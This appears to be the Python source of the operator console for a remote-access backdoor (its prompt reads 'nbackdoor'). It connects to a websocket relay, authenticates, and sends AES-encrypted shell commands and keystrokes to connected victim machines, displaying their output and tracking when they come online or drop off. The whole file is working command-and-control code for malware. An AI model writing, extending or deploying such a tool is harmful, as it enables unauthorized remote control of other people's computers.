#!/usr/bin/env python
# -*- coding: utf-8 -*-
import shlex
import os
import threading
from colorama import init
from colorama import Fore, Back, Style
import uuid
import json
import time
# from getpass import getpass
from base64 import b64decode, b64encode
import sys
import msvcrt
from websocket import create_connection
from Crypto.Cipher import AES
from _docpot import docopt
__author__ = 'nekocode'


def get_data(msg):
    return b64decode(msg['data'])


def get_char(msg):
    return b64decode(msg['char'])


class ControllerClient:
    def __init__(self):
        self.SERVER_HOST = 'ws://localhost:8888'
        self.HOST_NAME = hostname()
        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None
        self.to_client = None
        self.is_cmd_running = False

        self.exit = False
        init(autoreset=True)

    def run(self):
        while not self.exit:
            try:
                print 'Trying to connect server...'
                self.ws = create_connection(self.SERVER_HOST)
                print 'Connected!'

                # =====================
                # ======= Login =======
                # =====================
                pwd = raw_input('Enter the password: ')

                try:
                    sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
                                   'pwd': b64encode(self.encrypt(pwd))}
                    self.ws.send_binary(json.dumps(sercret_msg))
                except Exception as e:
                    print 'Connection lose:' + e.message
                    continue

                msg = json.loads(self.decrypt(self.ws.recv()))
                if 'data' not in msg:
                    continue
                data = get_data(msg)
                if data == 'login failed':
                    print Fore.RED + 'Login failed.'
                    self.exit = True
                else:
                    print Fore.RED + 'Login success!'

                # =======================
                # ======= Command =======
                # =======================
                while not self.exit:
                    input_str = raw_input(Back.RED + 'nbackdoor' +
                                          ((' in ' + str(self.to_client) + '') if self.to_client is not None else '') +
                                          ':' + Back.RESET + ' ')
                    if input_str == 'exit':
                        self.exit = True
                        break

                    msg = json.dumps({'cmd': b64encode(input_str)})
                    self.ws.send_binary(self.encrypt(msg))

                    self.is_cmd_running = True
                    OutputReceiver(self)

                    while True:
                        char = msvcrt.getch()
                        if not self.is_cmd_running:
                            break

                        self.send_char(char)

                self.ws.close()

            except Exception as e:
                print e.message if e.message else 'unkown err'

                if self.ws is not None:
                    self.ws.close()
                time.sleep(3)

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return ciphertext

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(ciphertext)
        return plain

    def send_char(self, char):
        self.ws.send_binary(self.encrypt(json.dumps({'char': b64encode(char)})))


class OutputReceiver(threading.Thread):
    def __init__(self, client):
        threading.Thread.__init__(self)

        self.client = client
        self.ws = client.ws
        self.decrypt = client.decrypt

        self.daemon = True
        self.start()

    def run(self):
        msg_recv = json.loads(self.decrypt(self.ws.recv()))
        if 'data' in msg_recv:
            while 'data' in msg_recv and 'end' not in msg_recv:
                data = get_data(msg_recv)
                print data

                msg_recv = json.loads(self.decrypt(self.ws.recv()))

        elif 'char' in msg_recv:
            while 'char' in msg_recv and 'end' not in msg_recv:
                char = get_char(msg_recv)
                sys.stdout.write(char)
                sys.stdout.flush()

                msg_recv = json.loads(self.decrypt(self.ws.recv()))

        elif 'connected' in msg_recv:
            self.client.to_client = msg_recv['connected']
            print 'Connected to client ' + str(self.client.to_client) + '.\n'
        elif 'disconnected' in msg_recv:
            if msg_recv['disconnected'] == 'offline':
                self.client.to_client = None
                print 'Client Offline.\n'
            else:
                self.client.to_client = None
                print 'Disconnected success.\n'

        self.client.is_cmd_running = False


def hostname():
    sys = os.name

    if sys == 'nt':
        return os.getenv('computername')
    elif sys == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unknow hostname'


def pwd_input(msg):
    print msg,

    import msvcrt
    chars = []
    while True:
        try:
            new_char = msvcrt.getch().decode(encoding="utf-8")
        except:
            return input("你很可能不是在 cmd 命令行下运行，密码输入将不能隐藏:")

        if new_char in '\r\n':  # 如果是换行，则输入结束
            break

        elif new_char == '\b':  # 如果是退格，则删除密码末尾一位并且删除一个星号
            if chars is not None:
                del chars[-1]
                msvcrt.putch('\b'.encode(encoding='utf-8'))     # 光标回退一格
                msvcrt.putch(' '.encode(encoding='utf-8'))      # 输出一个空格覆盖原来的星号
                msvcrt.putch('\b'.encode(encoding='utf-8'))     # 光标回退一格准备接受新的输入
        else:
            chars.append(new_char)
            msvcrt.putch('*'.encode(encoding='utf-8'))  # 显示为星号

    print
    return ''.join(chars)


def run_controller():
    client = ControllerClient()
    while not client.exit:
        client.run()


if __name__ == '__main__':
    run_controller()


